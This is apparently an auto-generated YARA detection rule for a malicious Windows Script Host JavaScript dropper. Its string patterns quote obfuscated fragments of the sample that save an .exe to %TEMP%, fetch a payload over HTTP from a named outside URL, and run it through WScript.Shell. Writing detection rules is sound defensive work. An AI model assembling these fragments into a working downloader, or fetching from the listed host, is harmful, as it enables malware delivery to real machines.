rule sig_20160328_828fab2d8dd43c4cd98fe2b4a2bf0dcd {
  meta:
    description = "datamaliciousorder - file 20160328_828fab2d8dd43c4cd98fe2b4a2bf0dcd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f0caf9e148132056a5dd913e025c68d71607f40e0a48d2948f0c5247cb243064"

  strings:
    $s1  = "function Kaoleguk() {return Jntxuwuz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nVc8edKCzmGx.exe\";};" fullword ascii
    $s2  = "Qobcpooxd[Cspyecf](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s3  = "function Btkomc(Sjbck, Gqnwjuntvm){return Sjbck - Gqnwjuntvm;};" fullword ascii
    $s4  = "var Jntxuwuz = function Xingu() {return WScript[Mfudtcjeh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "do {WScript[Cabhiiyrrb](Cdvozu() * 11)} while (Qobcpooxd[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Ftrut() {return ((Xwhptwuc == true) && (Xwhptwuc == Zmcouqhnku)) ? 1 : Ixifchgd;};" fullword ascii
    $s7  = "function Mnisryoy(Liyxktp){Jntxuwuz[\"Run\"](Liyxktp, Ixifchgd, Ixifchgd);};" fullword ascii
    $s8  = "function Mvjlw(Dfdpeg) {var Qcoleli = (1, 2, 3, 4, 5, Dfdpeg); return Qcoleli;};" fullword ascii
    $s9  = "var Fucno = false;" fullword ascii
    $s10 = "var Ecdxvpgsoq = new this[\"Date\"]();" fullword ascii
    $s11 = "function Baefk()" fullword ascii
    $s12 = " while (Gzepilz){" fullword ascii
    $s13 = "function Emhbiktkhy(){return Mfudtcjeh;};" fullword ascii
    $s14 = "Zmcouqhnku = true; " fullword ascii
    $s15 = "function Ztroztf(){return Ensrqwgo;};" fullword ascii
    $s16 = "var Xwhptwuc = false;" fullword ascii
    $s17 = "function Cdvozu(){return 22;};" fullword ascii
    $s18 = "var Zmcouqhnku = false;" fullword ascii
    $s19 = "Xwhptwuc = true; " fullword ascii
    $s20 = "return Btkomc(Ayfkfhy, Giidibos);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}